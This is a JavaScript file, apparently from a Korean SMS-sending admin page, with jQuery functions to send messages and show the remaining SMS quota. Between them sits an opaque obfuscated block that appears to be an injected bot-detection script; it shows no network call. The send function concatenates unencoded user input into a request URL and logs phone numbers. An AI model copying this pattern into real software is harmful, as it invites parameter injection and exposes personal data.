function sendSms() {	
	var msg = $('textarea[name=msg]').val();
	var rphone = $('input[name=rphone]').val();
	var action = $('input[name=action]').val();
	var sphone1 = $('input[name=sphone1]').val();
	var sphone2 = $('input[name=sphone2]').val();
	var sphone3 = $('input[name=sphone3]').val();
	console.log(msg);
	console.log(rphone);
	console.log(action);
	console.log(sphone1);
	console.log(sphone2);
	console.log(sphone3);
	var msg = {"msg": msg, "rphone":rphone, "action":action, "sphone1":sphone1, "sphone2":sphone2, "sphone3":sphone3};
	$.ajax({
		url : "SmsSend?msg="+$('textarea[name=msg]').val()+"&rphone="+rphone+"&action="+action+"&sphone1="+sphone1+"&sphone2="+sphone2+"&sphone3="+sphone3,
        type:'post',
        dataType:'json',
        cache:false,
        success:function(obj){
			$('textarea[name=msg]').val("");
			$('input[name=rphone]').val("");
			var result = obj.result;
            alert(result);
            location.reload(true);
            changePage();
        },error:function(obj){
			var result = obj.result;
            alert(result);
        }
    });     
}


(function(){
window.kph=!!window.kph;try{(function(){(function(a){var d=this[l("tnemucod")],g=[];try{a={" == f":!a};var h=d.getElementsByTagName("*");for(var k in h)if(a[" == f"])try{h[k].setAttribute("data-safe","true")}catch(m){g.push(m.message)}}catch(m){g.push(m.message)}return g;function l(m){var n="";for(var p in m)n=m[p]+n;return n}})(!0);var b=96;try{var ba,la,oa=c(531)?0:1,qa=c(380)?1:0;for(var va=(c(772),0);va<la;++va)oa+=(c(364),2),qa+=(c(894),3);ba=oa+qa;window.fb===ba&&(window.fb=++ba)}catch(a){window.fb=ba}var e=!0;
function f(a,d){a+=d;return a.toString(36)}function xa(a){var d=70;a&&(document[r(d,188,175,185,175,168,175,178,175,186,191,153,186,167,186,171)]&&document[r(d,188,175,185,175,168,175,178,175,186,191,153,186,167,186,171)]!==f(68616527596,d)||(e=!1));return e}function t(a){var d=arguments.length,g=[];for(var h=1;h<d;h++)g[h-1]=arguments[h]-a;return String.fromCharCode.apply(String,g)}
function r(a){var d=arguments.length,g=[];for(var h=1;h<d;++h)g.push(arguments[h]-a);return String.fromCharCode.apply(String,g)}function ya(){}xa(window[ya[f(1086758,b)]]===ya);xa(typeof ie9rgb4!==f(1242178186103,b));xa(RegExp("\x3c")[t(b,212,197,211,212)](function(){return"\x3c"})&!RegExp(t(b,216,147,196))[f(1372109,b)](function(){return"'x3'+'d';"}));
var za=window[t(b,193,212,212,193,195,200,165,214,197,206,212)]||RegExp(t(b,205,207,194,201,220,193,206,196,210,207,201,196),f(-78,b))[f(1372109,b)](window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]),Da=+new Date+(c(463)?750800:6E5),Ea,Fa,Ga,Ia=window[t(b,211,197,212,180,201,205,197,207,213,212)],Ja=za?c(463)?28910:3E4:c(686)?8102:6E3;
document[r(b,193,196,196,165,214,197,206,212,172,201,211,212,197,206,197,210)]&&document[r(b,193,196,196,165,214,197,206,212,172,201,211,212,197,206,197,210)](r(b,214,201,211,201,194,201,204,201,212,217,195,200,193,206,199,197),function(a){var d=39;document[t(d,157,144,154,144,137,144,147,144,155,160,122,155,136,155,140)]&&(document[r(d,157,144,154,144,137,144,147,144,155,160,122,155,136,155,140)]===f(1058781944,d)&&a[r(d,144,154,123,153,156,154,155,140,139)]?Ga=!0:document[t(d,157,144,154,144,137,
144,147,144,155,160,122,155,136,155,140)]===f(68616527627,d)&&(Ea=+new Date,Ga=!1,w()))});function w(){if(!document[t(41,154,158,142,155,162,124,142,149,142,140,157,152,155)])return!0;var a=+new Date;if(a>Da&&(c(440)?585055:6E5)>a-Ea)return xa(!1);var d=xa(Fa&&!Ga&&Ea+Ja<a);Ea=a;Fa||(Fa=!0,Ia(function(){Fa=!1},c(829)?0:1));return d}w();var Ka=[c(938)?10238029:17795081,c(420)?2147483647:27611931586,c(843)?1181457764:1558153217];
function Ma(a){var d=74;a=typeof a===f(1743045602,d)?a:a[t(d,190,185,157,190,188,179,184,177)](c(539)?23:36);var g=window[a];if(!g||!g[t(d,190,185,157,190,188,179,184,177)])return;var h=""+g;window[a]=function(k,l){Fa=!1;return g(k,l)};window[a][r(d,190,185,157,190,188,179,184,177)]=function(){return h}}for(var Pa=(c(495),0);Pa<Ka[f(1294399109,b)];++Pa)Ma(Ka[Pa]);xa(!1!==window[f(26741,b)]);window.Ta=window.Ta||{};window.Ta.nc="0804f557e0194000a692f03da21bf40f77e3ad0026f1f3675b5f836792c1cdbae4364785b4a86ab78c55ccefccc47e4b665db31e2bbb1d4eafb7347845aa0f59ff324e5d4ee1133a";
function B(a){var d=+new Date;if(!document[t(86,199,203,187,200,207,169,187,194,187,185,202,197,200,151,194,194)]||d>Da&&(c(52)?6E5:415646)>d-Ea)var g=xa(!1);else g=xa(Fa&&!Ga&&Ea+Ja<d),Ea=d,Fa||(Fa=!0,Ia(function(){Fa=!1},c(932)?0:1));return!(arguments[a]^g)}function c(a){return 383>a}
(function(){var a=/(A([0-9a-f]{1,4}:){1,6}(:[0-9a-f]{1,4}){1,1}Z)|(A(([0-9a-f]{1,4}:){1,7}|:):Z)|(A:(:[0-9a-f]{1,4}){1,7}Z)/ig,d=document.getElementsByTagName("head")[0],g=[];for(d&&(d=d.innerHTML.slice(0,1E3));d=null!==a.exec("");)g.push(d)})();})();}catch(x){}finally{ie9rgb4=void(0);};function ie9rgb4(a,b){return a>>b>>0};

})();


function getSMSCount(){
	$.ajax({
		url : "SMSCount",
        type : "get",
        dataType : "json",
        success : function(obj){
			var result = obj.result; 
            setSMSCount(result);
        },
        error : function(xhr, status, error){
    		alert("통신 실패");
        }
    });	
}

function setSMSCount(result){
	var table = document.getElementById("count");
	table.innerHTML = "";
	table.innerHTML += '<td>잔여 문자량: ' + result + '</td>';		
}


getSMSCount();




